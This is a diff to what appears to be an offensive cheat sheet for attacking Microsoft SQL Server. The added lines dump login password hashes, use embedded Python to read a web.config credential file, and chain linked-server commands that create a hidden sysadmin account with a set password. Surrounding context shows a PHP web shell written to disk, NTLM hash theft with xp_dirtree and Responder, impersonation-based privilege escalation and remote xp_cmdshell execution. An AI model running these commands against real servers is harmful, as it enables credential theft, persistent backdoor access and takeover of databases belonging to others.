@@ -71,10 +71,13 @@ SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns 1 if you are Admin
 -- 2. List Databases
 SELECT name FROM sys.databases;
 
--- 3. List Tables in current DB
+-- 3. Check if password's hashes are saved
+SELECT name, sid, password_hash FROM sys.sql_logins;
+
+-- 4. List Tables in current DB
 SELECT * FROM information_schema.tables;
 
--- 4. Check for Impersonation Candidates
+-- 5. Check for Impersonation Candidates
 -- Finds users you can "become" (PrivEsc)
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
 ```
@@ -122,6 +125,11 @@ EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"
 EXECUTE sp_OADestroy @FileID
 EXECUTE sp_OADestroy @OLE
 ```
+### Method 3: sp_execute_external_script
+We can use python for read protected files:
+```sql
+EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
+```
 ## 5. Attack: Stealing NTLM Hashes
 **Concept:** Force the MSSQL Service Account to authenticate to your machine via SMB. 
 **Tools:** `Responder` (Listener) + `xp_dirtree` (Trigger).
@@ -156,6 +164,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin'); -- Should be 1
 ```
 ## 7. Attack: Lateral Movement (Linked Servers)
 **Concept:** MSSQL servers are often "Linked" to allow cross-querying. If your server is linked to another, you can execute commands on the _remote_ server.
+**Article:** https://blog.netspi.com/how-to-hack-database-links-in-sql-server/
 ### Discovery
 ```sql
 -- List Linked Servers
@@ -172,4 +181,8 @@ EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_co
 
 -- 3. Execute Command on Remote Server
 EXECUTE('EXEC xp_cmdshell ''whoami''') AT [REMOTE_SRV01];
+
+-- 4. Create sysadmin account
+EXECUTE('EXECUTE(''CREATE LOGIN caulk WITH PASSWORD = ''''PSwd123!'''';'') AT [REMOTE_SRV00]') AT [REMOTE_SRV01]
+EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''caulk'''', ''''sysadmin'''''') AT [REMOTE_SRV00]') AT [REMOTE_SRV01]
 ```
